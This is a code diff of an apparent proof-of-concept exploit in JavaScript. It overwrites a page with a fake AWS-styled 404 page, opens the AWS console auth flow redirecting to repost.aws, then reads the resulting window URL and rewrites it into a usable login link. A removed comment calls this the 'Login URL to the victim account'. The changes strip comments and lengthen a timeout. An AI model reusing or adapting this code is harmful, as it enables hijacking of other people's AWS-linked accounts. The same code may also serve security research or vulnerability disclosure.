@@ -1,24 +1,3 @@
-// // Open a new window
-// function openNewWindow() {
-//   let newWindow = window.open('https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6IlhtWUI1V2hSUXdHN2IxX2RUZ1ZqSmcifQ&challenge=DU8HEwzh_enBtW4w7CNZGr1dwx-lrxMZa58_EL0ezGQ', '_blank');
-// };
-// // Check if the new window was successfully created
-// window.onload = function() {
-//             document.body.setAttribute('onload', 'openNewWindow()');
-// };
-
-// if (newWindow) {
-//   // Wait for 5 seconds before accessing the URL of the new window
-//   setTimeout(function () {
-//     // Access the URL of the new window
-//     let url = newWindow.location.href;
-//     let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
-//     alert("Login URL to the victim account: " + modifiedUrl);
-//   }, 5000); // 5000 milliseconds = 5 seconds
-// } else {
-//   alert("nothing");
-// }
-// Replace the content of the <html> element
 document.documentElement.innerHTML = `
 <!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type"content="text/html; charset=utf-8"/><meta name="viewport"content="width=device-width, initial-scale=1.0"/><title>404</title><style>
 
@@ -474,14 +453,11 @@ body.awsui-polaris-dark-mode {
 
 
 document.getElementById('openWindowBtn').addEventListener('click', function() {
-    // Open a new window (you can provide the URL of the page you want to open here)
     let newWindow = window.open("https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6IkVUU3NYX2xfVFc2bm14RF9GRVFMc1EifQ&challenge=puOwP1g5Dgh-jn9K38-VL3M8nYCu6nCLcE0CjiWo0ek", "_blank");
 
     if (newWindow) {
-        // Wait for 5 seconds before accessing the URL of the new window
         setTimeout(function () {
             try {
-                // Access the URL of the new window
                 let url = newWindow.location.href;
                 let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
                 var paragraph = document.getElementById("vic-url");
@@ -490,7 +466,7 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
             } catch (e) {
                 alert("Unable to access the URL of the new window due to security restrictions.");
             }
-        }, 7000); // 5000 milliseconds = 5 seconds
+        }, 7000); // 7000 milliseconds = 7 seconds
     } else {
         alert("Nothing");
     }
